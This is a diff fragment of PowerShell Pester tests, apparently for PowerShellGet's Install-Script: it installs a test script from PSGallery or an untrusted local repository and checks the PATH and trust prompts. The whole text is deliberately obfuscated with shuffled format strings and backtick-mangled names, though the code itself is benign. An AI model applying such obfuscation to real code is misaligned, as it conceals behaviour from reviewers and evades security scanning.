+            ${r`ES} = &("{2}{3}{1}{0}"-f'edScript','ll','Get-I','nsta') ("{4}{3}{1}{0}{2}"-f 'r','-ServerSc','ipt','kam','Fabri')
+            &("{0}{1}{2}"-f'Ass','e','rtEquals') ${r`es}."N`AMe" ("{4}{1}{2}{0}{3}"-f'rverScr','m','-Se','ipt','Fabrika') ('Insta'+'l'+'l-'+'Script '+'sh'+'o'+'uld '+'insta'+'ll'+' '+'a '+'scri'+'pt '+'e'+'ven '+'w'+'hen '+'prompt'+' '+'i'+'s '+'n'+'ot '+'accepte'+'d'+','+' '+"$res")
+
+            &("{0}{1}{2}"-f 'As','s','ert') ((${Env`:p`AtH} -split ';') -contains ${sCRip`T:ProGrA`mfI`Le`sSC`R`iP`T`SPA`TH}) ("{17}{12}{15}{5}{11}{18}{8}{10}{19}{22}{7}{6}{4}{2}{20}{21}{3}{0}{9}{14}{16}{1}{13}"-f 'iron','ariabl',' ','v','TH','-Pack','A','P','d add ','m','AllUser','a','nsta','e.','e','ll','nt v','I','ge shoul','s scope ','e','n','path to ')
+        }
+        finally {
+            
+            &("{1}{2}{0}{8}{9}{4}{3}{6}{5}{7}" -f '-P','S','et','bleForScriptsIns','ria','t','tallLoca','ion','A','THVa') -Scope ("{2}{0}{1}"-f'User','s','All')
+
+            &("{2}{1}{0}{4}{3}"-f'nstalled','-I','Get','cript','S') -Name ("{0}{2}{3}{4}{1}{6}{5}" -f 'Fab','erve','r','ikam','-S','pt','rScri') -ErrorAction ("{1}{2}{0}"-f 'ue','Silentl','yContin') | &("{0}{3}{1}{2}" -f 'Uni','ta','ll-Script','ns') -Force
+        }
+    } `
+        -Skip:$((${P`SE`di`TiOn} -eq ("{0}{1}"-f'Cor','e')) -or ( (varIAble ('zENJ'+'k')  )."v`ALuE"::"OSVE`R`Si`oN"."Ve`RSioN" -lt ("{2}{1}{0}"-f'0.0','20','6.2.9')) -or (${Ps`Cu`lTuRe} -ne ("{0}{1}" -f 'e','n-US')))
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{17}{15}{5}{9}{18}{19}{20}{1}{22}{14}{0}{10}{2}{8}{7}{4}{6}{12}{16}{11}{3}{21}{13}" -f'thU','lUsers_','date_','Variab','orA','P','ddi','PromptF','No','a','p','TH','ngtoP','e','a','stall','A','In','ckag','e_S','cript_Al','l','NoP') {
+
+        try {
+            
+            &("{1}{2}{0}" -f 'tem','Remov','eI') -Path ${S`c`R`IPT:PSg`eTSeTtIn`gSF`il`E`PAth}
+
+            
+            &("{7}{6}{3}{10}{4}{2}{12}{1}{5}{9}{8}{0}{11}" -f 't','tsIns','orSc','V','leF','tal','t-PATH','Rese','oca','lL','ariab','ion','rip') -Scope ("{0}{1}" -f 'All','Users')
+
+            ${nu`lL} = &((("{3}{6}{0}{9}{5}{11}{1}{2}{10}{7}{8}{4}"-f 'Ma','0}I','mport','Packag','r','e','e','eP','rovide','nagem','-Packag','nt{'))-f[cHar]92) -Name ("{1}{2}{3}{0}" -f'et','Po','wer','ShellG') -Force
+
+            &("{4}{2}{0}{1}{3}"-f 'acka','g','all-P','e','Inst') -Provider ("{0}{1}{2}"-f 'PowerShel','lG','et') -Type ("{0}{1}" -f 'Scr','ipt') -Name ("{3}{4}{2}{0}{1}" -f 'ikam-ServerS','cript','r','F','ab') -Source ("{2}{1}{0}"-f'llery','a','PSG') -NoPathUpdate -Force
+
+            ${r`ES} = &("{3}{2}{1}{0}"-f'pt','dScri','nstalle','Get-I') ("{2}{4}{3}{0}{1}"-f'erverScr','ipt','Fabrik','-S','am')
+            &("{0}{1}{2}{3}"-f'Ass','e','rt','Equals') ${R`ES}."Na`mE" ("{2}{0}{1}{4}{3}"-f 'er','v','Fabrikam-S','ipt','erScr') ('I'+'nstall-Sc'+'ript '+'s'+'hould'+' '+'instal'+'l '+'a '+'scr'+'ipt, '+"$res")
+
+            &("{1}{2}{0}" -f 'rt','A','sse') ((${eN`V:Pa`TH} -split ';') -notcontains ${sc`RI`pT:`PROgR`AMfI`L`EsscriPTSPaTh}) ("{14}{13}{10}{1}{12}{9}{3}{4}{7}{8}{2}{0}{5}{11}{6}" -f ' PAT','-','h to','ge should add ','AllUse','H env','nt variable.','rs scope',' pat','ka','ll','ironme','Pac','nsta','I')
+        }
+        finally {
+            
+            &("{6}{5}{0}{2}{7}{1}{9}{4}{3}{8}"-f'b','i','leForSc','llLocat','ta','ATHVaria','Set-P','r','ion','ptsIns') -Scope ("{2}{0}{1}" -f 'l','lUsers','A')
+
+            &("{3}{1}{2}{0}{4}"-f'ed','-Insta','ll','Get','Script') -Name ("{3}{4}{0}{1}{2}" -f'erScr','ip','t','F','abrikam-Serv') -ErrorAction ("{1}{3}{0}{4}{2}" -f'ly','Sil','nue','ent','Conti') | &("{4}{3}{1}{2}{0}"-f'll-Script','s','ta','n','Uni') -Force
+        }
+    } `
+        -Skip:$(${IsW`Indo`wS} -eq ${f`AL`Se})
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{8}{2}{13}{11}{12}{0}{5}{14}{4}{1}{9}{3}{6}{7}{10}"-f 'crip','_F','ns','rc','User','t_Def','e_NoPromptF','orAddi','I','o','ngtoPATHVariable','ackag','e_S','tallP','ault_') {
+        try {
+            
+            &("{0}{1}{2}"-f'RemoveIt','e','m') -Path ${scR`IP`T:Psg`eT`sEttingSfiLepAtH}
+
+            
+            &("{6}{2}{8}{3}{7}{0}{1}{9}{10}{5}{4}" -f'iableForSc','rip','eset','HV','allLocation','t','R','ar','-PAT','tsI','ns') -Scope ("{0}{1}"-f 'AllUs','ers')
+
+            ${nu`ll} = &((("{4}{2}{0}{6}{3}{7}{5}{1}" -f'0}Im','er','ment{','o','PackageManage','rovid','p','rt-PackageP')) -F  [CHAR]92) -Name ("{0}{4}{1}{3}{2}"-f'P','he','et','llG','owerS') -Force
+
+            &("{1}{2}{0}{3}{4}" -f'acka','Instal','l-P','g','e') -Provider ("{0}{1}{2}" -f'PowerShellG','e','t') -Type ("{1}{2}{0}"-f 'pt','S','cri') -Name ("{1}{0}{2}{3}{4}" -f'm-Se','Fabrika','r','ve','rScript') -Source ("{1}{2}{0}"-f'y','PSGal','ler') -Force
+
+            ${R`ES} = &("{0}{2}{3}{1}" -f 'G','ledScript','et-In','stal') ("{4}{2}{0}{1}{3}" -f'rikam-Se','rverSc','ab','ript','F')
+            &("{0}{3}{1}{2}"-f 'A','ertEq','uals','ss') ${r`ES}."n`AMe" ("{1}{2}{0}{3}"-f'e','Fabri','kam-S','rverScript') ('I'+'n'+'stall-'+'Script'+' '+'sho'+'u'+'ld '+'ins'+'tall '+'a '+'script'+','+' '+"$res")
+
+            if (${sC`RIPT:isc`O`REc`lR}) {
+                &("{0}{1}"-f 'Ass','ert') ((${E`N`V:pATh} -split ';') -contains ${S`c`RIpT:`M`y`DocUm`en`TsScriPTS`PatH}) ("{10}{4}{0}{1}{16}{3}{15}{7}{9}{18}{6}{14}{17}{5}{13}{19}{12}{2}{8}{11}" -f 'st','all-Package shou','a','d add ','n','nviron',' to P','u','b','rrentUs','I','le.','i','m','ATH','C','l',' e','er scope path','ent var')
+            }
+            else {
+                &("{0}{1}{2}"-f 'Ass','e','rt') ((${EN`V:`path} -split ';') -contains ${SCRi`P`T:prOGRA`MFIlEsSc`RiptSpa`Th}) ("{7}{6}{12}{14}{11}{13}{0}{10}{4}{3}{9}{8}{5}{1}{2}" -f' path to','le','.','nme','ATH enviro','ab','st','In','ri','nt va',' P','ckage should add All','all-','Users scope','Pa')
+            }
+        }
+        finally {
+            
+            &("{10}{3}{5}{8}{2}{7}{1}{4}{0}{6}{9}"-f'ti','tsInstal','For','et-P','lLoca','ATHVaria','o','Scrip','ble','n','S') -Scope ("{1}{0}" -f's','AllUser')
+
+            &("{3}{0}{2}{1}{4}"-f 'et-Insta','l','l','G','edScript') -Name ("{1}{4}{0}{2}{3}" -f'm-','Fabri','Se','rverScript','ka') -ErrorAction ("{3}{0}{1}{2}" -f 'i','len','tlyContinue','S') | &("{0}{3}{1}{2}"-f 'U','ins','tall-Script','n') -Force
+        }
+    } `
+        -Skip:$(${iSw`ind`oWs} -eq ${f`ALSE})
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{4}{7}{9}{6}{12}{13}{1}{3}{11}{8}{10}{0}{2}{5}"-f'ATH','r_N','Vari','O_to','InstallPack','able','pt_Curren','age_','omptForAddingt','Scri','oP','ThePr','t','Use') {
+        try {
+            
+            &("{1}{2}{0}" -f 'oveItem','Re','m') -Path ${SCRi`pT`:p`SG`EtSEt`T`ing`sFIl`epaTh}
+
+            
+            &("{7}{2}{3}{6}{0}{4}{1}{8}{5}" -f 'eForSc','sIns','TH','Vari','ript','on','abl','Reset-PA','tallLocati') -Scope ("{0}{2}{3}{1}" -f 'Cu','User','rre','nt')
+            ${Nu`lL} = &((("{7}{2}{8}{6}{0}{5}{1}{3}{4}"-f 'Manageme','t-PackagePro','ack','vi','der','ntsyZImpor','e','P','ag'))-REplace  'syZ',[CHAR]92) -Name ("{1}{0}{3}{2}"-f 'w','Po','hellGet','erS') -Force
+
+            ${o`UTpUt`P`Ath} = ${sCRiPT`:`TEm`PpATh}
+            ${G`UID} =  ( GeT-VAriAble ('ql'+'m')  -vaLuEo)::("{2}{1}{0}"-f'guid','ew','n').Invoke().("{0}{1}{2}"-f'to','s','tring').Invoke()
+            ${O`UtPu`T`Fi`lePatH} = &("{1}{2}{0}" -f'h','Join-','Pat') ${ouTpu`T`p`Ath} "$guid"
+            ${R`UNsPAce} = &("{3}{2}{4}{1}{0}" -f 'RunSpace','e','r','C','eat') ${ouTpuTFi`LE`P`AtH} 1
+
+            
+            ${Glo`Bal:pRO`xy}."Ui"."C`HO`ICetOmaKe" = 1
+
+            ${COnT`e`NT} = ${n`ULl}
+
+            try {
+                ${rEsu`lT} = &("{3}{2}{1}{0}" -f 'mmand','teCo','u','Exec') ${r`UNsp`ACE} ("{15}{12}{20}{13}{10}{18}{16}{9}{17}{6}{11}{21}{1}{0}{19}{3}{5}{14}{2}{7}{8}{4}"-f 'm-Ser','rika','SGa','cript','er',' -Sour','c','llery -Scope Cur','rentUs','-Typ','der PowerShellGe','ript -Nam','ge ','Provi','ce P','Install-Packa',' ','e S','t','verS','-','e Fab')
+            }
+            finally {
+                ${fIlE`NA`me} = ("{2}{3}{6}{1}{4}{0}{5}" -f'x','e-0','PromptFo','r','.t','t','Choic')
+                ${pA`Th} = &("{0}{1}{2}{3}"-f 'j','oin-','pa','th') ${Ou`Tp`UTfILePaTH} ${fIlE`N`Ame}
+                if (&("{2}{1}{0}"-f'h','Pat','Test-') ${P`AtH}) {
+                    ${con`T`ent} = &("{1}{0}{2}" -f 'et-con','g','tent') ${PA`TH}
+                }
+
+                &("{0}{2}{1}"-f'Clos','nSpace','eRu') ${RU`NSP`ACe}
+                &("{1}{0}{2}" -f'e','RemoveIt','m') ${ou`TP`Utf`ilE`paTH}
+            }
+
+            ${i`NS`TALlsH`ou`Ld`Pro`cESsm`eSSAGe} = ${ScRI`pT:`l`oca`LiZEDd`Ata}."S`c`RIptp`A`THPROmpTquerY" -f (${S`C`RipT:mYDoCumentSsc`Ri`pt`sPaTh})
+            &("{0}{1}"-f'Asse','rt') (${C`o`NtEnt} -and (${C`OnTe`Nt} -eq ${I`NsTAllsHO`U`L`dP`ROC`ess`m`eSSAGE})) ('In'+'stall '+'scr'+'ipt'+' '+'pr'+'ompt'+' '+'for'+' '+'addin'+'g'+' '+'to'+' '+'PATH'+' '+'va'+'ri'+'abl'+'e '+'i'+'s '+'n'+'ot '+'wo'+'rki'+'n'+'g, '+"Expected:$installShouldProcessMessage, "+"Actual:$content")
+
+            ${r`eS} = &("{2}{1}{0}{4}{3}" -f'Sc','alled','Get-Inst','ipt','r') ("{1}{3}{0}{5}{4}{2}" -f 'Server','Fa','ript','brikam-','c','S')
+            &("{0}{2}{1}"-f'AssertEqu','s','al') ${R`eS}."Na`ME" ("{1}{4}{3}{2}{5}{0}"-f 'Script','Fabrik','erve','S','am-','r') ('I'+'nst'+'all-Scr'+'ipt'+' '+'sh'+'ould'+' '+'inst'+'all '+'a '+'scr'+'ipt'+' '+'eve'+'n '+'whe'+'n '+'prompt'+' '+'i'+'s '+'no'+'t '+'ac'+'cepted'+', '+"$res")
+        }
+        finally {
+            
+            &("{0}{5}{4}{7}{6}{1}{2}{3}" -f'Se','l','Lo','cation','-PAT','t','criptsInstal','HVariableForS') -Scope ("{0}{2}{3}{1}" -f 'Cu','r','rre','ntUse')
+            &("{2}{0}{3}{4}{1}{5}" -f 'In','p','Get-','stalled','Scri','t') -Name ("{3}{1}{2}{4}{5}{0}" -f 'pt','b','ri','Fa','kam-','ServerScri') -ErrorAction ("{5}{3}{2}{0}{1}{4}" -f'i','nu','tlyCont','ilen','e','S') | &("{1}{0}{2}{3}{4}"-f 'tall','Unins','-','Scrip','t') -Force
+        }
+    } `
+        -Skip:$((${PSeD`I`TiON} -eq ("{0}{1}" -f 'C','ore')) -or (  (  Get-VARIabLe  ZEnjK  -vALuEONLy )::"O`SVer`siOn"."veRsI`On" -lt ("{0}{2}{1}"-f '6.2.92','0.0','0')) -or (${P`ScUl`T`URE} -ne ("{0}{1}"-f'en','-US')))
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{1}{6}{3}{4}{13}{0}{15}{16}{10}{17}{14}{11}{5}{2}{7}{12}{9}{8}"-f'c','Insta','tForAd','P','ackage_','omp','ll','di','able','Vari','r','r_YES_toThePr','ngtoPATH','S','Use','ript_C','u','rent') {
+        try {
+            
+            &("{0}{1}{2}"-f 'R','emov','eItem') -Path ${Sc`R`i`pt:P`SGEtS`ETTiNGS`FiL`eP`Ath}
+
+            
+            &("{7}{9}{1}{8}{4}{6}{3}{2}{0}{5}" -f'l','-P','tsInsta','ip','ariableForS','lLocation','cr','Res','ATHV','et') -Scope ("{1}{0}{2}"-f 'urrent','C','User')
+            ${n`Ull} = &(("{4}{9}{10}{7}{8}{1}{0}{2}{5}{6}{3}"-f'Imp','Xf','or','rovider','P','t','-PackageP','ent','D','ackageManage','m'))."rEPL`A`cE"('DXf',[STrIng][chaR]92) -Name ("{2}{0}{1}{3}"-f 'Sh','el','Power','lGet') -Force
+
+            ${oUtP`U`TPatH} = ${scr`i`PT:TEmPPa`Th}
+            ${g`Uid} =   (ITem ("vArI"+"A"+"B"+"LE:qLm"))."VA`lUE"::("{0}{1}"-f 'newgui','d').Invoke().("{0}{2}{1}"-f 't','ing','ostr').Invoke()
+            ${o`UTp`UTfile`path} = &("{1}{0}"-f'ath','Join-P') ${o`Ut`put`patH} "$guid"
+            ${ru`NSpacE} = &("{2}{3}{0}{1}{4}" -f 'nSp','a','Create','Ru','ce') ${OUtPut`F`Il`E`pAth} 1
+
+            
+            ${GLobaL`:`pRo`XY}."Ui"."chO`IC`ETo`makE" = 0
+
+            ${C`ONTe`Nt} = ${Nu`lL}
+
+            try {
+                ${REsU`LT} = &("{2}{3}{1}{0}" -f'and','mm','Exe','cuteCo') ${rU`N`spaCE} ("{9}{7}{5}{8}{18}{3}{6}{16}{1}{13}{15}{2}{10}{19}{11}{20}{4}{0}{21}{22}{17}{14}{12}"-f'-Sourc','owerShe',' Scri','ov',' ','-','ider','ll','Packag','Insta','pt -Name','kam','ser','llGet -Ty','entU','pe',' P','cope Curr','e -Pr',' Fabri','-ServerScript','e ','PSGallery -S')
+            }
+            finally {
+                ${FIle`N`Ame} = ("{6}{4}{3}{1}{2}{0}{5}"-f'tx','h','oice-0.','C','For','t','Prompt')
+                ${pa`TH} = &("{0}{1}{2}"-f 'jo','in-','path') ${OUTPutFi`Le`Pa`Th} ${F`i`LENaME}
+                if (&("{0}{1}" -f 'T','est-Path') ${P`ATh}) {
+                    ${conT`e`NT} = &("{0}{3}{1}{2}" -f 'g','te','nt','et-con') ${pA`Th}
+                }
+
+                &("{0}{2}{1}"-f 'Clo','pace','seRunS') ${ruNs`pACE}
+                &("{0}{3}{2}{1}"-f 'Remov','em','t','eI') ${oU`TPUtFil`epA`Th}
+            }
+
+            ${i`NSt`Al`LsHouLD`prOce`SSm`ESSAGE} = ${Sc`R`i`PT:LOcaLi`ZeDDAta}."scRI`Pt`pAthPr`OmptquErY" -f (${s`CriPT`:my`doC`UMeNt`ssCriPTS`patH})
+            &("{0}{1}" -f 'As','sert') (${c`ONt`enT} -and (${C`O`NtENt} -eq ${I`NstaL`lsHOuLd`pRo`C`esSmeSSaGe})) ('I'+'nsta'+'ll '+'sc'+'ript '+'p'+'romp'+'t '+'for'+' '+'add'+'ing '+'to'+' '+'PATH'+' '+'va'+'r'+'ia'+'ble '+'i'+'s '+'not'+' '+'wor'+'k'+'ing, '+"Expected:$installShouldProcessMessage, "+"Actual:$content")
+
+            ${R`eS} = &("{3}{0}{4}{1}{2}"-f't','r','ipt','Get-Ins','alledSc') ("{1}{2}{5}{0}{3}{4}" -f 'erSc','Fabri','kam-Se','rip','t','rv')
+            &("{1}{3}{0}{2}" -f'Eq','A','uals','ssert') ${R`es}."na`ME" ("{1}{5}{3}{2}{0}{4}"-f 'Server','F','ikam-','r','Script','ab') ('I'+'ns'+'tall-Sc'+'ript '+'s'+'h'+'ould '+'inst'+'all '+'a '+'sc'+'ript'+' '+'even'+' '+'when'+' '+'p'+'rompt'+' '+'i'+'s '+'not'+' '+'ac'+'cepte'+'d, '+"$res")
+
+            &("{1}{0}" -f 't','Asser') ((${e`Nv:path} -split ';') -contains ${SCrIPT`:`MydocU`MEnTSSC`RI`pTsPaTh}) ("{4}{6}{9}{3}{5}{15}{7}{20}{12}{18}{8}{2}{19}{16}{1}{17}{11}{14}{10}{13}{0}"-f'le.','n',' scope path','ll-S','In','c','s','p','tUser','ta','ia','a','d ','b','r','ri','o','ment v','Curren',' to PATH envir','t should ad')
+        }
+        finally {
+            
+            &("{4}{2}{9}{3}{5}{7}{1}{6}{0}{8}"-f 'io','sInstallL','t-','ariableFor','Se','Scri','ocat','pt','n','PATHV') -Scope ("{3}{2}{0}{1}" -f 'rent','User','ur','C')
+            &("{4}{3}{2}{1}{0}"-f 'dScript','lle','ta','s','Get-In') -Name ("{3}{2}{6}{5}{4}{0}{1}"-f'erScr','ipt','r','Fab','v','-Ser','ikam') -ErrorAction ("{2}{1}{3}{4}{0}"-f'e','lent','Si','lyCont','inu') | &("{1}{3}{2}{4}{0}"-f'ipt','Uninsta','-','ll','Scr') -Force
+        }
+    } `
+        -Skip:$((${ps`EDItI`on} -eq ("{0}{1}" -f'C','ore')) -or ( $zeNjk::"o`sVE`RSion"."V`ER`siON" -lt ("{1}{0}{2}" -f'200','6.2.9','.0')) -or (${PSC`U`lturE} -ne ("{0}{1}" -f 'en-','US')))
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{9}{0}{6}{5}{7}{8}{11}{3}{12}{1}{2}{4}{10}" -f 'nstallA','A','n','positor','dNo','iptFrom','Scr','U','ntrust','I','ToPrompt','edRe','y') {
+        try {
+            
+            &("{3}{0}{4}{2}{1}"-f'er-P','ry','osito','Regist','SRep') -Name ("{0}{2}{4}{1}{3}" -f 'Untrus','e','tedTes','po','tR') -SourceLocation ${s`crIp`T:tE`mpPatH} -ScriptSourceLocation ${SCR`Ip`T:UNtr`UsT`EdrEPo`SourC`eLOCAt`IOn}
+            ${SC`RiptRe`pO} = &("{0}{2}{1}{3}"-f 'Get-PS','sit','Repo','ory') -Name ("{3}{1}{2}{4}{0}"-f'TestRepo','t','ruste','Un','d')
+            &("{4}{1}{6}{2}{3}{0}{7}{5}" -f 'it','Equa','seIn','sens','Assert','e','lsCa','iv') ${scrIpT`R`Epo}."sCRIpTS`OuR`CelOcA`TiOn" ${sC`RipT`:`Un`TRuSTEd`REPOsOUrCe`l`OcA`T`iOn} ((("{3}{6}{8}{12}{5}{0}{14}{13}{1}{10}{4}{2}{7}{9}{11}"-f'MqT','poMqT is not re','r','Test','red p',' ',' ','op','reposit','e','giste','rly','ory','tedTestRe','Untrus')) -CRePLACE'MqT',[cHAr]39)
+
+            ${OUT`p`UtPAtH} = ${s`CrIpt:tE`MPp`ATH}
+            ${G`UId} =   (  gci  varIABlE:QLM  )."vA`LUE"::("{2}{1}{0}" -f 'guid','ew','n').Invoke().("{0}{2}{1}" -f 't','ng','ostri').Invoke()
+            ${outP`UtF`i`le`PaTH} = &("{1}{2}{0}" -f 'ath','Joi','n-P') ${oUT`PUTP`A`TH} "$guid"
+            ${RU`NSpA`cE} = &("{1}{2}{3}{0}" -f'ace','Create','R','unSp') ${Out`P`U`TFILep`ATh} 1
+
+            if (${PsverS`I`O`NtaBLe}."pSVeR`s`iON" -ge ("{1}{0}"-f'.0.0','4')) {
+                
+                ${gLObA`l`:`pRoxY}."UI"."chO`ic`e`TOmake" = 2
+            }
+            else {
+                
+                ${g`l`obAL:p`Ro`Xy}."Ui"."Ch`Oi`cETomAkE" = 1
+            }
+
+            ${C`ON`TENT} = ${N`UlL}
+            try {
+                ${R`eSuLt} = &("{0}{1}{2}{3}" -f'Exe','c','ut','eCommand') ${r`Unsp`Ace} ("{3}{0}{1}{16}{15}{6}{10}{4}{17}{7}{8}{14}{12}{2}{9}{13}{18}{11}{5}" -f'ns','tall-Script Fa','itor','I','cr','stRepo','rver','-','Rep','y Untru','S','Te','s','s','o','kam-Se','bri','ipt ','ted')
+            }
+            finally {
+                ${FI`lEn`AME} = ("{0}{5}{1}{2}{4}{3}"-f'Pro','p','t','orChoice-0.txt','F','m')
+                ${Pa`TH} = &("{1}{0}" -f 'ath','join-p') ${oU`TPU`TF`I`lEPAth} ${F`iL`eNAME}
+                if (&("{0}{1}{2}"-f'Te','st-Pat','h') ${pA`TH}) {
+                    ${coNT`Ent} = &("{3}{0}{1}{2}" -f't-con','ten','t','ge') ${Pa`TH}
+                }
+
+                &("{0}{3}{4}{2}{1}"-f 'Close','ace','Sp','R','un') ${RU`N`SPaCE}
+                &("{0}{1}{2}"-f'Re','moveI','tem') ${OU`Tp`UTFi`LEPATH}
+            }
+
+            ${ITeM`INfO} = &("{0}{1}{2}" -f'Find-S','c','ript') ("{1}{3}{2}{0}{4}" -f'verSc','Fabrika','er','m-S','ript')
+            ${A`CceP`T`pROm`ptMessAgE} = ("{6}{1}{3}{8}{5}{4}{9}{7}{2}{0}"-f 'om','re you su','ripts fr','r','all t','st','A','c','e you want to in','he s')
+            &("{0}{1}" -f 'Asser','t') (${conTE`NT} -and ${coNt`e`Nt}.("{0}{1}" -f'C','ontains').Invoke(${A`cC`Ep`TPromP`T`MESs`AGE})) ('Promp'+'t'+' '+'for'+' '+'i'+'nstalli'+'ng '+'a '+'scr'+'ipt '+'f'+'rom '+'an'+' '+'untr'+'u'+'st'+'ed '+'rep'+'ositor'+'y '+'i'+'s '+'not'+' '+'wo'+'r'+'king, '+"$content")
+            ${R`ES} = &("{1}{2}{4}{0}{3}"-f'dSc','G','et-Inst','ript','alle') ("{2}{0}{5}{4}{3}{1}"-f 'a','Script','F','-Server','am','brik') -ErrorAction ("{0}{2}{1}{3}"-f'Si','ntinu','lentlyCo','e') -WarningAction ("{1}{3}{2}{0}" -f 'inue','Sile','Cont','ntly')
+            &("{0}{1}" -f'As','sert') (-not ${r`Es}) ("{2}{9}{12}{6}{10}{4}{5}{3}{0}{11}{1}{7}{8}"-f 'ompt ','s','Install','f pr','not install a sc','ript i','shou',' not acce','pted','-Scr','ld ','i','ipt ')
+        }
+        finally {
+            &("{2}{3}{1}{4}{0}"-f'tory','Repo','Get-','PS','si') -Name ("{1}{4}{5}{3}{2}{0}"-f'dTestRepo','U','e','t','nt','rus') -ErrorAction ("{5}{2}{3}{4}{1}{0}" -f 'ontinue','C','ilen','tl','y','S') | &("{1}{2}{4}{0}{3}{5}" -f'-','Un','reg','PSRepos','ister','itory') -ErrorAction ("{0}{1}{3}{2}" -f 'Sile','ntlyCon','e','tinu')
+        }
+    } `
+        -Skip:$((${Ps`CUlTu`Re} -ne ("{0}{1}"-f 'e','n-US')) -or (${Ps`V`e`Rsio`NtaBlE}."Ps`V`ErSion" -lt ("{1}{0}" -f'0.0','4.')) -or (${Ps`E`DiTIon} -eq ("{1}{0}"-f 're','Co')))
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{9}{12}{5}{11}{8}{2}{0}{1}{13}{3}{6}{4}{14}{10}{7}" -f 'n','tru','FromU','t','R','ta','ed','ndYesToPrompt','lAScript','I','positoryA','l','ns','s','e') {
+        try {
+            
+            &("{4}{2}{5}{6}{1}{0}{3}" -f 'r','to','er','y','Regist','-PSRep','osi') -Name ("{3}{1}{2}{4}{0}"-f'epo','ru','stedTes','Unt','tR') -SourceLocation ${Sc`R`IPT:`TEmPp`AtH} -ScriptSourceLocation ${sCR`Ip`T:uNtRuS`TEd`RE`Po`SOURCeLo`C`AtiOn}
+            ${Sc`R`iPTR`epo} = &("{1}{3}{0}{2}" -f'PSReposito','Get','ry','-') -Name ("{0}{3}{2}{1}{5}{4}"-f 'Untru','edTe','t','s','Repo','st')
+            &("{3}{1}{2}{4}{0}{5}{6}"-f'ualsC','s','sertE','A','q','aseInsensiti','ve') ${scRi`pt`RE`PO}."S`CrIPt`Sourcel`ocAT`iOn" ${SCriPt:UnT`Ru`S`TeDR`EpoS`OUr`ceLOC`A`TIOn} ((("{11}{6}{1}{0}{13}{5}{3}{14}{2}{7}{10}{9}{4}{12}{8}"-f'itory {0}Untru','s','po{','dTes','registered','te','est repo','0} i','rly',' not ','s','T',' prope','s','tRe'))  -F[cHAr]39)
+
+            ${oUt`PUTpA`TH} = ${Sc`RI`pT`:`TEmPpATh}
+            ${gU`iD} =  ( itEm VaRIaBLe:qLM  )."VA`Lue"::("{1}{0}{2}" -f 'ewg','n','uid').Invoke().("{2}{0}{1}" -f'os','tring','t').Invoke()
+            ${Ou`TpUtf`Il`EpaTH} = &("{2}{0}{1}" -f'in-Pat','h','Jo') ${O`U`TPu`TPaTH} "$guid"
+            ${Ru`NS`P`ACE} = &("{0}{1}{2}" -f 'Create','RunSpa','ce') ${OutpU`TFIle`pa`TH} 1
+
+            
+            ${g`loBa`L`:PRo`Xy}."uI"."ChOiCe`TOm`AkE" = 0
+            ${c`oNT`Ent} = ${nU`ll}
+            try {
+                ${RESU`lt} = &("{4}{3}{1}{2}{0}" -f 'nd','teComm','a','xecu','E') ${rUNs`pACE} ("{12}{5}{3}{10}{1}{2}{18}{8}{9}{7}{0}{13}{14}{6}{17}{4}{11}{15}{16}" -f 'epositor','brik','a','l','dTe','al','trust','verScript -R','-','Ser','-Script Fa','stR','Inst','y U','n','e','po','e','m')
+            }
+            finally {
+                ${F`il`enAME} = ("{4}{5}{1}{0}{2}{3}" -f'hoice-0.','C','t','xt','Promp','tFor')
+                ${pA`TH} = &("{0}{2}{1}"-f'join-p','h','at') ${OuT`putfIleP`A`TH} ${FI`leN`AMe}
+                if (&("{1}{2}{0}"-f'Path','Tes','t-') ${p`ATh}) {
+                    ${C`ON`TEnt} = &("{0}{2}{1}"-f 'get-','nt','conte') ${pa`TH}
+                }
+
+                &("{1}{2}{3}{0}"-f'nSpace','C','lose','Ru') ${RU`NsPa`ce}
+                &("{2}{1}{0}"-f 'eItem','mov','Re') ${oU`T`pUTF`iLepaTh}
+            }
+
+            ${aCc`ePt`p`RoMpt`meSS`AgE} = ("{0}{8}{6}{5}{12}{9}{10}{3}{11}{1}{2}{7}{4}" -f'A',' scrip','t','stall th','m','e y','you sur','s fro','re ','i','n','e','ou want to ')
+            &("{0}{1}" -f 'Asser','t') (${CO`Nt`enT} -and ${cO`N`TEnt}.("{0}{1}{2}"-f'Co','nt','ains').Invoke(${AC`cEp`TP`RomptM`eSsAGE})) ('Prom'+'pt '+'fo'+'r '+'i'+'nsta'+'lling '+'a '+'s'+'crip'+'t '+'from'+' '+'a'+'n '+'unt'+'ruste'+'d '+'r'+'eposit'+'or'+'y '+'i'+'s '+'not'+' '+'wor'+'king, '+"$content")
+
+            ${R`eS} = &("{1}{4}{0}{3}{2}" -f 'lle','Get-I','t','dScrip','nsta') ("{0}{2}{1}{3}"-f'Fa','r','b','ikam-ServerScript')
+            &("{0}{2}{1}" -f'Asse','s','rtEqual') ${R`Es}."N`AME" ("{4}{2}{5}{3}{0}{6}{1}" -f'S','pt','abri','Server','F','kam-','cri') ('In'+'s'+'tall-Script'+' '+'shoul'+'d'+' '+'insta'+'ll '+'a '+'sc'+'ri'+'pt '+'i'+'f '+'prom'+'pt '+'i'+'s '+'accept'+'ed,'+' '+"$res")
+        }
+        finally {
+            &("{2}{0}{4}{1}{3}"-f'-P','posi','Get','tory','SRe') -Name ("{0}{2}{4}{1}{3}" -f 'Unt','tedTe','ru','stRepo','s') -ErrorAction ("{1}{0}{2}{3}{4}"-f'nt','Sile','l','y','Continue') | &("{4}{5}{3}{2}{6}{0}{1}" -f 'tor','y','Repos','PS','Unregiste','r-','i') -ErrorAction ("{4}{0}{1}{2}{3}" -f 'ilent','l','yCont','inue','S')
+        }
+    } `
+        -Skip:$((${PS`CUlt`UrE} -ne ("{0}{1}"-f 'en-U','S')) -or (${PSvE`RsiOntAB`lE}."p`s`VeRSiON" -lt ("{1}{0}"-f '.0.0','4')) -or (${pSe`di`TioN} -eq ("{0}{1}" -f'C','ore')))
+
+    
+    &('It') ("{14}{11}{1}{7}{10}{8}{5}{6}{4}{9}{15}{3}{12}{0}{13}{2}"-f 'iredVer','etInst','n','dRe','u','ptWit','hM','alledSc','i','ltiNam','r','alidateG','qu','sio','V','esAn') {
